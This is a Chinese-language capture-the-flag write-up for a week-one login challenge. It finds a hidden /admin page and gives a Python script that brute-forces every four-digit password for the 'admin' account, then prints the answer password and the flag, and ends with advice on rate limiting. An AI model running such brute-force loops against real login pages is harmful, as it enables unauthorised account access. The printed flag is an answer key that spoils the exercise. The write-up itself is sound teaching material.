# week1看看你能登陆吗

## 题目简述

网站存在未公开的 `/admin` 登录页。页面提示密码是四位纯数字，用户名为常见管理员账号 `admin`，可以利用登录响应作为判断条件枚举全部 `0000` 到 `9999`。

## 解题过程

先访问常见后台路径或进行小范围目录枚举，定位到 `/admin`。登录表单提交字段为 `logname` 和 `logpass`；错误凭据返回固定的错误提示，正确凭据会直接显示 flag，因此可以建立稳定的响应判据。

枚举密码时必须保留前导零：

```python
import requests

target = "http://challenge/admin/"

for value in range(10000):
    password = f"{value:04d}"
    response = requests.post(
        target,
        data={"logname": "admin", "logpass": password},
        timeout=5,
    )
    if "error username or password" not in response.text:
        print(password, response.text)
        break
```

正确密码为 `0310`。仓库源码使用严格比较：

```php
if ($a === 'admin' && $b === '0310') {
    echo $flag;
}
```

最终得到：

```text
0xGame{y0u_brut3_f0rc3_successfully}
```

## 方法总结

本题考察目录发现、表单字段识别和小密码空间枚举。四位数字只有 $10^4=10000$ 种组合，格式化为四位字符串是关键，否则会漏掉 `0000` 到 `0999`。实际系统应限制失败次数、增加速率控制，并避免使用可枚举的短密码。
